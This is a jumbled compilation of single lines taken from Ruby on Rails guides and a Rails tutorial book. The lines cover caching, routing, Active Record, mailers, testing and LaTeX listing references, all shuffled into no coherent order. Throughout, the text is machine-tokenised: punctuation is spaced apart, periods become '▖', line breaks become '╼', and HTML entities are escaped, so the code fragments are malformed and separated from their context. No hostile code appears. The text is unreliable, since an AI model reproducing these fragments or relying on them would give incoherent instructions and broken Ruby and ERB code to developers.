* `config ▖ cache _ store` configures which cache store to use for Rails caching ▖
See `ActionController : : Caching : : Fragments` for more information .
* `action _ controller ▖ set _ configs` Sets up Action Controller by using the settings in `config ▖ action _ controller` by `send` &apos; ing the method names as setters to `ActionController : : Base` and passing the values through .
1235551234 ▖ to _ s ( : phone , area _ code : true , extension : 555 )
The generation of the writer instance method can be prevented by setting the option ` : instance _ writer` to `false` .
You should verify at this point that the test suite is red :
will return a maximum of 5 clients and because it specifies no offset it will return the first 5 in the table ▖
Listing ~ \ ref { code : friendly _ forwarding _ code } also uses the \ kode { request } object ( via \ kode { request ▖ url } ) to get the URL of the requested page .
You can pass more than one symbol for each class method and the respective ╼ validations will be run in the same order as they were registered .
Running Code Before Rails
$ rails s
&lt; h3 &gt; New comment &lt; / h3 &gt;
Note the presence of \ texttt { https : / / } and a lock icon in the address bar of Figure ~ \ ref { fig : signup _ failure _ mockup } , which indicate that SSL is working .
Adding an action for the Contact page ▖
First , we can assign attributes individually , as we did in Section ~ \ ref { sec : a _ user _ class } :
# # # # submit _ tag
mime _ version : &quot; 1 ▖ 0 &quot; ,
HTTP / 1 ▖ 1 302 Moved Temporarily
If you already have RubyGems installed , you should make sure your system uses the version used in this tutorial :
&quot; author _ id &quot; ▖ humanize ( capitalize : false ) # = &gt; &quot; author &quot;
The \ kode { full \ _ title } helper returns a base title , ``Ruby on Rails Tutorial Sample App &apos; &apos; , if no page title is defined , and adds a vertical bar preceded by the page title if one is defined ( Listing ~ \ ref { code : title _ helper } )
Symbol ) ?
```bash
$ mv README ▖ rdoc README ▖ md
&lt; / div &gt;
# top _ menu { display : none }
There are just three methods that you need to send pretty much any email ╼ message :
All these configuration options are delegated to the `I18n` library .
This idea strikes a balance between descriptive routes and deep nesting ▖
It also defines the instance predicates `past ? ` , `today ? ` , and `future ? ` , all of them relative to `Time ▖ current` .
As Action Mailer now uses the &#91; Mail gem &#93; ( https : / / github ▖ com / mikel / mail ) , this ╼ becomes as simple as adding to your `config / environments / $ RAILS _ ENV ▖ rb` file :
We &apos;ll get started by generating a test file for password resets :
This means that it &apos;s ╼ possible to save an object in the database in an invalid state if you aren &apos;t ╼ careful .
╼ x + = 1
* How to package assets with a gem .
Grounded in examples from Chapter ~ \ ref { cha : static _ pages } , this chapter explores some elements of the Ruby programming language that are important for Rails .
You can send plain text - with no markup at all - back to the browser by using ╼ the ` : plain` option to `render` :
Default is &quot; , and &quot; .
Rails has built-in support for converting objects to JSON and rendering that JSON back to the browser :
The new steps appear in Listing ~ \ ref { code : user _ logout _ test } .
This will be the default behavior in future versions of
# config ▖ mock _ with : rr
&lt; / ul &gt;
`qualified _ const _ defined ? ` behaves this way :
Returns a checkbox tag tailored for accessing a specified attribute .
url _ field ( : user , : url )
In order to test the form submission , we need to issue a \ texttt { POST } request to the \ kode { users \ _ path } ( Table ~ \ ref { table : RESTful _ users } ) , which we can do with the \ kode { post } function :
In this section , we &apos;ll outline our plans for the demo application .
validates : email , uniqueness : true , on : : create
That includes the initialization of the framework itself , engines , and all the application &apos;s initializers in `config / initializers` ▖
WARNING : _ HTTP headers are dynamically generated and under certain circumstances user input may be injected ▖
╼ ╼ \ subsection { A validity test } % ( fold ) ╼ \ label { sec : a _ validity _ test } ╼ ╼ As noted in Box ~ \ ref { aside : when _ to _ test } , test-driven development isn &apos;t always the right tool for the job , but model validations are exactly the kind of features for which TDD is a perfect fit ▖
in Listing ~ \ ref { code : user _ show _ microposts _ test } .
( We won &apos;t bother with this step again , but it &apos;s good to see it at least once ▖ )
To get the test suite to pass , we &apos;ll remove the \ kode { provide } line from the Home page &apos;s view , as seen in Listing ~ \ ref { code : home _ page _ base _ title } .
orders ( force _ reload = false )
* `config ▖ assets ▖ js _ compressor` defines the JavaScript compressor to use ▖
The User model we created in Section ~ \ ref { sec : user _ model } now has working \ kode { name } and \ kode { email } attributes , but they are completely generic : any string ( including an empty one ) is currently valid in either case .
Next will be avoiding duplicate JavaScript files ▖
var = foo
( As you might guess , Active Record creates a \ kode { find \ _ by \ _ name } method as well ▖ )
* * `ActionDispatch : : RemoteIp` * *
# # # # `to _ xml`
`beginning _ of _ year` is aliased to `at _ beginning _ of _ year` , and `end _ of _ year` is aliased to `at _ end _ of _ year` .
&#124; NULL &#124; NULL &#124; NULL &#124; 1 &#124; Using where &#124;
# # # # javascript _ path
They can also be removed from the stack completely :
The \ kode { where } method is a flexible and powerful way to create database queries .
Since its debut in 2004 , Ruby on Rails has rapidly become one of the most powerful and popular frameworks for building dynamic web applications .
# No first _ name instance reader is generated .
@ articles = current _ user ▖ visible _ articles ▖ where ( name : params &#91; : name &#93; )
I find this approach to be more flexible than Cucumber step definitions , particularly when the matchers or should helpers naturally take an argument , such as \ kode { valid \ _ signin ( user ) } .
Rails allows ╼ you to use the `dependent` option of an association to achieve this ▖
By replacing the question marks in Listing ~ \ ref { code : string _ shuffle } with the appropriate methods , combine \ kode { split } , \ kode { shuffle } , and \ kode { join } to write a function that shuffles the letters in a given string .
You might note that there &apos;s one column in Figure ~ \ ref { fig : sqlite _ database _ browser } not accounted for in the migration : the \ kode { id } column .
We &apos;ve come now to the end of the high-level overview of a Rails application .
You can also supply HTML attributes as an additional option hash ▖
Now that we have a working ( though not yet complete ) user profile page , we &apos;re ready to make a signup form for our site .
# # # # # ` : autosave`
In ╼ this situation , the only parameters that matter are the ones from the form .
Via : 1 ▖ 1 vegur
( Because \ kode { &apos; 1&apos; } is the default value of \ kode { remember \ _ me } , we could omit the corresponding option in the first case above , but I &apos;ve included it to make the parallel structure more apparent ▖ )
* How to generate and edit an Action Mailer class and mailer view .
In older-style HTML , \ kode { div } tags are used for nearly all site divisions , but HTML5 adds the \ kode { header } , \ kode { nav } , and \ kode { section } elements for divisions common to many applications .
If you use the `readonly` method , then the associated objects will be read-only when retrieved via the association .
Here ``welcome &apos; &apos; is the controller name and ``index &apos; &apos; is the action within that controller .
Defining the root route in this way has a second important effect , which is to create named routes that allow us to refer to routes by a name rather than by the raw URL ▖ In this case , these routes are \ kode { root \ _ path } and \ kode { root \ _ url } , with the only difference being that the latter includes the full URL :
The \ kode { Micropost } class , highlighting inheritance .
The reason is that we are quite far from writing a working web interface for following users , but it &apos;s hard to proceed without some sort of \ emph { client } for the code we &apos;re developing .
&lt; / html &gt;
A factory to simulate User model objects .
If non-duplicate information is provided you will get all unique values , environment variable still takes precedence in cases of any conflicts .
# # # # Sending Email To Multiple Recipients
It &apos;s thus important to test for case-insensitivity , which we do with the code in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } .
# = &gt; &#91;
It &apos;s the opinion of the Rails team ╼ that model-level validations are the most appropriate in most circumstances .
modeling-users
Every Rails application comes with a standard set of middleware which it uses in this order in the development environment :
The flash-less profile page after a browser reload .
( If you don &apos;t currently have a user in your database , you should visit Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } now and complete it before proceeding ▖ )
EXPLAIN for : SELECT `articles` .
A profile with an unfollow button and incremented followers count .
has _ many : orders ,
* If the argument responds to `to _ ary` the method is invoked ▖
In this chapter , we &apos;ll develop a simple demonstration application to show off some of the power of Rails .
And , believe it or not , in this chapter we &apos;ll even put our first app on the wider web by \ emph { deploying } it to production ( Section ~ \ ref { sec : deploying } ) .
This is set to false in ╼ `config / environments / production ▖ rb` which is generated by Rails ▖
Change still seems reasonable to you ?
This time we &apos;ll create a `Comment` model to hold ╼ reference of article comments ▖
The Users controller in schematic form .
Here the option \ kode { dependent : : destroy } in
$ git clone git : / / github ▖ com / rails / rails ▖ git
The generated code also includes an instance variable ( \ kode { @ greeting } ) , which is available in the mailer views in much the same way that instance variables in controllers are available in ordinary views .
The rest of the tutorial focuses on developing a single large \ emph { sample application } ( called \ kode { sample \ _ app } ) , writing all the code from scratch .
as shown in Listing ~ \ ref { code : authorize _ before _ filter } .
But since constants and modules are indeed kind of decoupled , module objects can become unreachable :
( We &apos;ll discuss this subject in more depth in Section ~ \ ref { sec : remember _ me } ▖ )
&#124; --------------- &#124; ------------- &#124;
page = Page ▖ find _ by ( address : email ▖ to ▖ first )
Caching will only happen if `ActionController : : Base ▖ perform _ caching` is set to true ( which is the case by default for the Rails production environment , but not for the development environment ) .
user ▖ reset _ password !
in ╼ \ end { code } ╼ ╼ \ subsection { Sessions controller } % ( fold ) ╼ \ label { sec : sessions _ controller } ╼ ╼
and authenticate the user with code like
# # # Naming Routes
In the above case there are still two readings ▖
Next , we need a test to capture the sequence shown in Figure ~ \ ref { fig : failed _ login _ flash } and Figure ~ \ ref { fig : flash _ persistence } .
Running the toy app in production .
$ cat config / database ▖ yml
As with RSpec , Factory Girl defines a domain-specific language in Ruby , in this case specialized for defining Active Record objects .
The `author` association will be hard-coded to the ╼ `User` class for the time being .
# # # # Search Paths
* How to use the methods added to your models by creating associations .
If you want your form builder class to be loaded after initialization ( so it &apos;s reloaded on each request in development ) , you can pass it as a `String`
= = = = = = = = = = = = =
NOTE : Defined in `active _ support / core _ ext / hash / keys ▖ rb` .
&lt; % = f ▖ label : name % &gt; &lt; br &gt;
* Prefer ` &amp; &amp; ` / ` &#124; &#124; ` over `and` / `or` .
* In Rails 4 ▖ 0 , `SCRIPT _ NAME` is properly nested when engines are mounted on an app that &apos;s served from a URL prefix ▖
It is OK that the helper module does not exist , so if an exception for that constant name is raised it should be silenced ▖
in Listing ~ \ ref { code : home _ page _ signup _ link } .
resources : ads , as : &apos; periodical _ ads&apos;
&#124; GET &#124; / photos &#124; photos # index &#124; images _ path &#124;
* ` : inverse _ of`
Now that the basic User model is complete , we &apos;ll create a user in the database as preparation for making a page to show the user &apos;s information in Section ~ \ ref { sec : showing _ users } .
* * ` : table _ name _ with _ underscore` would make the primary key for the Customer class `customer _ id`
Listing ~ \ ref { code : home _ view _ erb _ title } is our first example of embedded Ruby , also called \ emph { ERb } .
in Listing ~ \ ref { code : log _ in _ function } .
Whenever someone goes to the root path where the engine is ╼ mounted , they should be shown a list of articles ▖
To include `http : / / example ▖ com / main ▖ js` :
Array assignment in Ruby copies a \ emph { reference } to the array , not the full array itself , which means that changes to the original array also affect the copy .
If a helper is specific to a particular controller , you should put it in the corresponding helper file ; for example , helpers for the StaticPages controller generally go in \ kode { app / helpers / static \ _ pages \ _ helper ▖ rb } .
Direct experimentation with SQLite on my system and PostgreSQL on Heroku show that this step is , in fact , necessary .
We &apos;ll build on the test from Listing ~ \ ref { code : flash _ persistence _ test } and write a series of steps to verify the following sequence of actions :
render &apos; new&apos;
That should be reraised ▖
Many computer programs involve incrementing a variable , as in
Adding an image to the Micropost model .
Because we &apos;ll want to use the same login technique in a couple of different places , we &apos;ll define a method called \ kode { log \ _ in } in the Sessions helper , as shown in Listing ~ \ ref { code : log _ in _ function } .
git : init
* What makes an engine .
Using \ kode { self } ensures that assignment sets the user &apos;s \ kode { remember \ _ token } , and as a result it will be written to the database along with the other attributes when the user is saved .
raise e unless e ▖ missing _ name ?
With the \ kode { @ user } instance variable as defined in Listing ~ \ ref { code : mail _ account _ activation } , we can create the necessary links using the named edit route and embedded Ruby , as shown in Listing ~ \ ref { code : account _ activation _ view _ text } and Listing ~ \ ref { code : account _ activation _ view _ html } .
While the array constructor \ kode { Array ▖ new } takes an initial value for the array , \ kode { Hash ▖ new } takes a \ emph { default } value for the hash , which is the value of the hash for a nonexistent key :
( Note that this is a technical term ; in particular , it &apos;s \ emph { not } a misspelling of ``memorization &apos; &apos; ▖ )
# # # # Timestamps
# # # vendor / plugins
It is also ╼ possible to control when to run these custom validations by giving an ` : on` ╼ option to the `validate` method , with either : ` : create` or ` : update` .
database : blog _ development
The default user fixtures ▖
This generates the same routes as the previous example :
We &apos;ll start by giving users the ability to update their profiles , which will also provide a natural opportunity to enforce an authorization model ( made possible by the authentication code in Chapter ~ \ ref { cha : log _ in _ log _ out } ) .
in Listing ~ \ ref { code : raw _ home _ view } and
In particular , let &apos;s write a test to verify that the first micropost in the database is the same as a fixture micropost we &apos;ll call \ kode { most \ _ recent } , as shown in Listing ~ \ ref { code : micropost _ order _ test } .
The model tests should now be \ passing :
This simply involves filling in the second arguments of the \ kode { link \ _ to } functions with the proper named routes .
Footer partial with links .
Write tests before refactoring code , focusing on testing error-prone code that &apos;s especially likely to break .
To make the view for new password resets , we &apos;ll work in analogy with the previous form for making a new non--Active Record resource , namely , the login form ( Listing ~ \ ref { code : login _ form } ) for creating a new session , shown again in Listing ~ \ ref { code : login _ form _ redux } for reference .
Many Rails programmers find Cucumber especially convenient when doing client work ; since they can be read even by non-technical users , Cucumber tests can be shared with ( and can sometimes even be written by ) the client .
@ user = user
One of the most powerful features of Rails is the ability to form \ emph { associations } between different data models .
The raw home view ( \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ) .
s = sanitize ( user _ input , tags : tags , attributes : % w ( href title ) )
The description starts in upper case and ends with a full stop-it &apos;s standard English .
* `add _ view _ paths` Adds the directory `app / views` from the application , railties and engines to the lookup path for view files for the application .
&lt; a href = &quot; # &quot; data-background-color = &quot; # 000099 &quot; data-text-color = &quot; # FFFFFF &quot; &gt; Paint it blue &lt; / a &gt;
@ article = Article ▖ find ( params &#91; : id &#93; )
The name of this method could change , or the return value , or this entire class may disappear ; there &apos;s no guarantee and so you shouldn &apos;t depend on this API in your plugins or applications ▖
# = &gt; &lt; select id = &quot; people &quot; name = &quot; people &quot; &gt; &lt; option &gt; David &lt; / option &gt; &lt; / select &gt;
WARNING : If you are upgrading from Rails 3 , please take into account that assets ╼ under `lib / assets` or `vendor / assets` are available for inclusion via the ╼ application manifests but no longer part of the precompile array ▖
In addition , on error pages Rails automatically wraps the fields with errors in \ kode { div } s with the CSS class \ kode { field \ _ with \ _ errors } .
The ` : batch _ size` option allows you to specify the number of records to be retrieved in each batch , before being passed individually to the block ▖
Active Record uses naming conventions for the columns in database tables , ╼ depending on the purpose of these columns .
Now , when we visit / users / 1 , the Rails server shows a \ kode { byebug } prompt :
belongs _ to : customer , touch : true
SafeErb reminds you to escape strings from external sources .
&lt; li &gt; ` : file` : save emails to files ; can be configured by using `config ▖ action _ mailer ▖ file _ settings` ▖ &lt; / li &gt;
NOTE ▖ Due to the chmod operation `atomic _ write` performs , if the target file has an ACL set on it this ACL will be recalculated / modified .
Blorgh : : Engine ▖ routes ▖ draw do
NOTE : Routing both `GET` and `POST` requests to a single action has security implications ▖
You can do so by running :
The same format can be used to set carbon copy ( Cc : ) and blind carbon copy ╼ ( Bcc : ) recipients , by using the ` : cc` and ` : bcc` keys respectively .
Instead , hash indices , or \ emph { keys } , can be almost any object .
Finally , many , many readers---far too many to list---have contributed a huge number of bug reports and suggestions during the writing of this book , and I gratefully acknowledge their help in making it as good as it can ~ be .
# # # # time _ zone _ select
In other words , the dot \ kode { ▖ } in \ kode { ▖ center } indicates that the rule styles a class .
A custom prefix may also be configured :
When we write
In the process , we &apos;ll see a first example of the branch , edit , commit , merge workflow that I recommend using with Git
However , any model method overrides will ╼ not be available ▖
The result appears in Figure ~ \ ref { fig : password _ reset _ form } .
When submitting the signup form developed in this chapter , the name , email address , and password get sent over the network , and hence are vulnerable to intercept .
Here is the sequence I recommend :
X-Runtime : 0 ▖ 014297
Calling `to _ s` on a safe string returns a safe string , but coercion with `to _ str` returns an unsafe string .
By running the test suite , verify that the \ kode { before \ _ save } callback can be written using the ``bang &apos; &apos; method \ kode { email ▖ downcase ! } \ to modify the \ kode { email } attribute directly , as shown in Listing ~ \ ref { code : downcase _ bang } .
To apply it , we just migrate the database :
This will enable Rails to recognize paths such as ` / comments / new / preview` with GET , and route to the `preview` action of `CommentsController` ▖
In particular , it doesn &apos;t enforce any constraints on the uploaded file , which can cause problems if users try to upload large files of invalid file types .
Create a new file at `app / views / blorgh / comments / _ comment ▖ html ▖ erb` and put this ╼ line inside it :
In the next chapter , we &apos;ll build on the foundation from Chapter ~ \ ref { cha : beginning } to make a database-backed \ emph { toy app } , which will give us our first real taste of what Rails can do .
Instead , we &apos;ll simulate the same series of steps using an \ emph { integration test } , which allows us to write an end-to-end test of our application &apos;s behavior .
There &apos;s also a related idiom that uses the splat operator :
Running EXPLAIN
This ╼ will be the template used for the email , formatted in HTML :
You &apos;re getting this error now because Rails expects plain actions like this one ╼ to have views associated with them to display their information ▖
12345678 ▖ 05 ▖ to _ s ( : delimited , separator : &quot; &quot; ) # = &gt; 12,345,678 05
You can invalidate the cache by altering this fingerprint , ╼ which happens automatically whenever you change the file contents .
Here we tell Factory Girl about the micropost &apos;s associated user just by including a user in the definition of the factory :
Previously , calling a mailer method on a mailer class will result in the ╼ corresponding instance method being executed directly ▖
It then uses \ kode { cookies } to create permanent cookies for the user id and remember token as described above .
For example `seconds _ since _ midnight` might not return the real amount in such a day .
# &lt; Client id : 3 , first _ name : &quot; Filo &quot; &gt;
```erb
Finally , since the \ emph { Ruby on Rails Tutorial } uses Rails ~ 4 , the knowledge you gain here represents the state of the art in web development .
Because the messages are generated by the model validations , they will automatically change if you ever change your mind about , say , the format of email addresses , or the minimum length of passwords .
even though the underlying model is called Relationship .
For one thing , if the review title is &quot; Flanagan &amp; Matz rules ! &quot; the output won &apos;t be well-formed because an ampersand has to be escaped as &quot; &amp; amp ; amp ; &quot; ▖
The index by itself doesn &apos;t enforce uniqueness , but the option \ kode { unique : true } does .
To help understand where this comes from , Table ~ \ ref { table : valid _ email _ regex } breaks it into bite-sized pieces
* `stylesheets` turns on the hook for stylesheets in generators ▖
User add some examples to ( or delete )
Finally , even if you decide not to use the cloud IDE exclusively in real life ( and I certainly recommend learning other tools as well ) , it provides an excellent introduction to the general capabilities of text editors and other development tools .
The \ kode { generate } script takes an optional list of actions , so we &apos;ll include actions for the Home and Help pages directly on the command line , while intentionally leaving off the action for the About page so that we can see how to add it ( Section ~ \ ref { sec : getting _ started _ with _ testing } ) .
create
&lt; th &gt; Title &lt; / th &gt;
@ article = Article ▖ new ( article _ params )
Wrap this block around expensive operations or possible bottlenecks to get a time reading for the operation .
The value for this option must be a range .
A controller &apos;s purpose is to receive specific requests for the application ▖ ╼
One annoyance associated with using the \ kode { rspec } command is having to switch to the command line and run the tests by hand .
The SQL equivalent of the above is :
To get the delete links to work , we need to add a \ kode { destroy } action ( Table ~ \ ref { table : RESTful _ users } ) , which finds the corresponding user and destroys it with the Active Record \ kode { destroy } method , finally redirecting to the users index , as seen in Listing ~ \ ref { code : destroy _ action } .
Thus , to be as secure as possible , we will err on the side of caution and use private repositories by default .
Note that the name of the migration file is prefixed by a \ emph { timestamp } based on when the migration was generated .
If it doesn &apos;t , then `create` is called ▖
If you don &apos;t have automated tests that exercise the bulk of your application , you &apos;ll need to spend time manually exercising all the parts that have changed ▖
This guide covers getting up and running with Ruby on Rails .
In the process of putting the new links into the layout , we &apos;ll take advantage of Bootstrap &apos;s ability to make dropdown menus , which you can read more about on the \ href { http : / / getbootstrap ▖ com / 2 ▖ 3 ▖ 2 / components ▖ html } { Bootstrap components page } .
╼ end
2 ▖ years ▖ from _ now
The `collection ▖ where` method finds objects within the collection based on the conditions supplied but the objects are loaded lazily meaning that the database is queried only when the object ( s ) are accessed ▖
At this point , our test suite should be \ passing :
The micropost index page ( \ href { http : / / localhost : 3000 / microposts } { / microposts } ) .
in Listing ~ \ ref { code : failing _ validates _ name _ test } .
We &apos;ll adopt Twitter &apos;s convention and call them \ emph { following } ( as in ``50 following , 75 followers &apos; &apos; ) , with a corresponding \ kode { calvin ▖ following } array .
def discount _ cannot _ be _ greater _ than _ total _ value
If he has , watching the relevant RailsCast first will often save you a ton of time .
* application-wide styles to this file and they &apos;ll appear at the top of the
end
The ` : as` option lets you override the normal naming for the named route helpers ▖
* * Not all caches will reliably cache content where the filename only differs by ╼ query parameters * *
Then initialize a Git repository and make the first commit :
Each name includes the &quot; @ &quot; sign .
This is true only once we get good at writing tests , though , which is one reason it &apos;s important to start practicing as early as possible .
respond _ to do &#124; format &#124;
The Rails way to accomplish this is to use a special variable called the \ emph { flash } , which we can treat like a hash .
In contrast , inside Chrome the \ kode { user \ _ id } cookie hasn &apos;t been deleted , so \ kode { user \ _ id } will be \ kode { true } in a boolean context and the corresponding user will be found in the database :
# # # Connecting URLs to Code
The `where` method lets you specify the conditions that the associated object must meet .
TIP : If you want to link to an action in the same controller , you don &apos;t need to ╼ specify the ` : controller` option , as Rails will use the current controller by ╼ default .
If you &apos;re using Git for version control , you should run the following command :
In the present case , because \ texttt { let } memoizes the \ texttt { found \ _ user } variable , the \ texttt { find \ _ by } method will only be called once whenever the User model specs are run .
&lt; % = link _ to &apos; Ad details &apos; , url _ for ( &#91; @ magazine , @ ad &#93; ) % &gt;
# # # # # The ` : layout` Option
To get started , we &apos;ll generate a Sessions controller with a \ kode { new } action :
-134 ▖ ordinalize # = &gt; &quot; -134th &quot;
http : / / mycdnsubdomain ▖ fictional-cdn ▖ com / assets / smile ▖ png
The next level is to simply load all extensions to `Object` ▖
Time ▖ local ( 2000 , 5 , 31 ) ▖ prev _ quarter # = &gt; Tue , 29 Feb 2000
╼ ╼ \ subsection { A working follow button the standard way } % ( fold ) ╼ \ label { sec : a _ working _ follow _ button _ the _ standard _ way } ╼ ╼
Unlike the default setting set this to true when running ( absolutely not recommended ! ) or testing your app in production mode using WEBrick ▖
The way to do this is with a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Callback _ ( computer _ science ) } { \ emph { callback } } , which is a method that gets invoked at a particular point in the lifetime of an Active Record object ( see the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 0 ▖ 0 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } ) .
DOCTYPE html &gt;
# gem &apos; libnotify &apos; , &apos; 0 ▖ 8 ▖ 0&apos;
As seen at the end of Listing ~ \ ref { code : rails _ command } , running \ kode { rails new } automatically runs the \ kode { bundle install } command after the file creation is done .
Adding Factory Girl to the \ kode { Gemfile } .
Here the return value is \ kode { nil } because the \ kode { home } action is blank .
In Listing ~ \ ref { code : remember _ me _ checkbox } , we &apos;ve included the CSS classes \ kode { checkbox } and \ kode { inline } , which Bootstrap uses to put the checkbox and the text ( ``Remember me on this computer &apos; &apos; ) in the same line .
Data accessible to the public ( e ▖ g ▖ , via web browsers ) , such as error pages
For example , the sample application \ kode { production ▖ rb } configuration file appears as follows :
&lt; / head &gt;
Finally , it &apos;s often convenient to use the ternary operator in a function &apos;s return value :
You can use the ` : layout` option to tell Rails to use a specific file as the layout for the current action :
The account activation text view .
Do not attempt to use `include ? ` to enforce distinctness ╼ in an association ▖
The status feed partial defers the feed item rendering to a feed item partial using the code
To avoid this , add the following line to your test environment :
# = &gt; &lt; textarea cols = &quot; 20 &quot; rows = &quot; 30 &quot; id = &quot; comment _ text &quot; name = &quot; comment &#91; text &#93; &quot; &gt;
A test for the user &apos;s \ kode { microposts } attribute .
Maybe you can provide additional information to help reproduce a bug , or help by eliminating needless steps that aren &apos;t required to demonstrate the problem .
╼ = &gt; &quot; test &quot;
The third feature of the asset pipeline is it allows coding assets via a ╼ higher-level language , with precompilation down to the actual assets ▖
exist app / views / microposts
* Rails 4 ▖ 0 requires that routes using `match` must specify the request method ▖
Breaking down the valid email regex .
Add tests for the sidebar micropost counts ( including proper pluralization ) .
as shown in Listing ~ \ ref { code : users _ fixtures _ extra _ users } .
* = require _ tree .
Commenting out the before filter to test our security model ▖
to explicitly test an `XmlHttpRequest` .
The \ kode { Guardfile } updated for Spork .
# # # # `test` Directory
orders ▖ where ( ▖ ▖ ▖ )
Note that we &apos;ve used the \ kode { post \ _ via \ _ redirect } variant to post to the users path .
Adding a test for the ``Settings &apos; &apos; link .
Be sure to get first to Red , and then to Green .
In that case , the virtual \ kode { password } attribute was created automatically by \ kode { has \ _ secure \ _ password } , but we &apos;ll have to write the code for a \ kode { remember \ _ token } ourselves .
# # # # number _ with _ delimiter
The effect is that Rails insulates you almost entirely from the details of the data store .
Mailing the account activation link .
As required , initially our test suite is passing ( \ passing ) .
&lt; li &gt; ` : test` : save emails to `ActionMailer : : Base ▖ deliveries` array ▖ &lt; / li &gt;
If you want to find the maximum value of a field in your table you can call the `maximum` method on the class that relates to the table ▖
$ sqlite3 --version
That &apos;s it ▖
&gt; &gt; 5 ▖ megabytes
Model annotation
# Logs out the current user .
Combining these two ╼ powers , a JavaScript writer can make a web page that can update just parts of ╼ itself , without needing to get the full page data from the server ▖
* `before _ initialize` : This is run directly before the initialization process of the application occurs with the ` : bootstrap _ hook` initializer near the beginning of the Rails initialization process .
The \ kode { followed } association isn &apos;t actually needed until Section ~ \ ref { sec : following } , but the parallel follower / followed structure is clearer if we implement them both at the same time .
It &apos;s good practice in general to enforce some minimum standards on passwords to make them harder to guess .
C ▖ subclasses # = &gt; &#91; &#93;
http : / / www ▖ cbsnews ▖ com / stories / 2002 / 02 / 15 / weather _ local / main501644 ▖ shtml ? zipcode = 1-- &gt;
In the mean time , have patience and a little faith---the whole point of this tutorial is to take you \ emph { beyond } this superficial , scaffold-driven approach to achieve a deeper understanding of Rails .
create _ customer
You &apos;ll focus on this folder for the remainder of this guide .
If you want to set up a one-to-one relationship between two models , you &apos;ll need to add `belongs _ to` to one , and `has _ one` to the other ▖
At this point , all the tests should be \ passing :
Verify that the flash message \ emph { doesn &apos;t } appear on the new page .
# rest of your routes
\ label { fig : cloud9 _ two _ spaces } } ╼ \ end { figure } ╼ ╼ \ subsection { Installing Rails } % ( fold ) ╼ \ label { sec : installing _ rails } ╼ ╼ The development environment from Section ~ \ ref { sec : development _ environment } includes all the software we need to get started except for Rails itself .
# # # # label _ tag
as seen in Listing ~ \ ref { code : create _ destroy _ micropost _ tests } .
The code in this section is adapted from the \ href { http : / / github ▖ com / thoughtbot / clearance } { Clearance } gem by \ href { http : / / thoughtbot ▖ com / } { thoughtbot } .
( We &apos;ll see starting in Section ~ \ ref { sec : uniqueness _ validation } how to make a migration from scratch ▖ )
`prev _ month` is aliased to `last _ month` .
= &gt; &#91; 42 , 8 , 17 &#93;
# # # Older Versions of Ruby on Rails
The actions in Listing ~ \ ref { code : relationships _ controller _ ajax } degrade gracefully , which means that they work fine in browsers that have JavaScript disabled ( although a small amount of configuration is necessary , as shown in Listing ~ \ ref { code : degrade _ gracefully } ) .
We also want to ensure that the password and confirmation match .
&lt; % = f ▖ label : body % &gt; &lt; br &gt;
# Bundle edge Rails instead :
There is quite a bit of overhead here , especially if you don &apos;t have extensive programming experience , so don &apos;t get discouraged if it takes a while to get started .
This arranges for a top-level heading ( \ kode { &lt; h1 &gt; } ) with the content \ kode { Sample App } , which should get the test to pass .
To go along with the validations in Listing ~ \ ref { code : validate _ picture _ format } and Listing ~ \ ref { code : micropost _ model _ image _ validation } , we &apos;ll add two client-side checks on the uploaded image .
This check is performed only if `email _ confirmation` is not `nil` ▖
Rails will ╼ pluralize your class names to find the respective database table ▖
The results of a successful user signup , with flash message ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ flash _ bootstrap-full ▖ png } { ( full size ) }
&lt; p &gt;
# # # Unicode character routes
create app / assets / stylesheets / scaffold ▖ css
now ▖ all _ month
* ` : layout`
Same as `prev _ month` and `next _ month` ▖
create app / views / microposts / _ form ▖ html ▖ erb
Alternatively , you can simply copy the existing ╼ `secret _ key _ base` from the `secret _ token ▖ rb` initializer to `secrets ▖ yml` ╼ under the `production` section , replacing &apos; &lt; % = ENV &#91; &quot; SECRET _ KEY _ BASE &quot; &#93; % &gt; &apos; .
config ▖ action _ mailer ▖ raise _ delivery _ errors = true
create _ account !
` &lt; % = javascript _ include _ tag params &#91; : controller &#93; % &gt; ` or ` &lt; % = stylesheet _ link _ tag ╼ params &#91; : controller &#93; % &gt; `
resources : articles
# # # Wrapping
Unsafe values are automatically escaped :
xml ▖ div {
So , first we &apos;ll use Git &apos;s version of the Unix \ kode { mv } ( move ) command to change the name :
Mailers are namespaced ╼ as well .
# # # # Linking to Feeds with the `auto _ discovery _ link _ tag`
Creating the first app repository at Bitbucket .
In the console session in Section ~ \ ref { sec : a _ user _ class } , we created a new user object with \ kode { User ▖ new } , which we had access to only after requiring the example user file in Listing ~ \ ref { code : example _ user } .
&#124; File / Folder &#124; Purpose &#124;
To implement the forwarding behavior shown in Figure ~ \ ref { fig : login _ page _ protected _ mockup } , we &apos;ll use a \ emph { before filter } in the Users controller .
Unlike the Users resource , which uses a database back-end ( via the User model ) to persist data , the Sessions resource will use cookies , and much of the work involved in login comes from building this cookie-based authentication machinery .
Using the simple \ kode { nano } text editor , fill a file called \ kode { ▖ irbrc } in the home directory with the contents of Listing ~ \ ref { code : irbrc } :
form _ for
&lt; % = render @ article ▖ comments % &gt;
So _ attack vectors for Header Injection are based on the injection of CRLF characters in a header field .
Finally , we &apos;ll add the URL to the users link in the site &apos;s navigation header using \ kode { users \ _ path } , thereby using the last of the unused named routes in Table ~ \ ref { table : RESTful _ users } .
The generated view for the Home page .
( We &apos;ll see this expectation fulfilled in Section ~ \ ref { sec : edit _ form } ▖ )
File Names
And to remove browser related middleware ,
The page to show a user ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 } { / users / 1 } ) .
The CSS in Listing ~ \ ref { code : logo _ css } converts the text to uppercase and modifies its size , color , and placement .
Because our code is well-tested , we can refactor with confidence , assured that we are unlikely to break our site &apos;s functionality .
in Listing ~ \ ref { code : sign _ in _ function } .
At this point , the tests should be \ passing :
&lt; % = stylesheet _ link _ tag &quot; application &quot; , debug : true % &gt;
&#91; `form _ tag` &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / FormTagHelper ▖ html # method-i-form _ tag ) ╼ is very similar to `form _ for` ▖
Analogously , `all _ week` , `all _ month` , `all _ quarter` and `all _ year` all serve the purpose of generating time ranges .
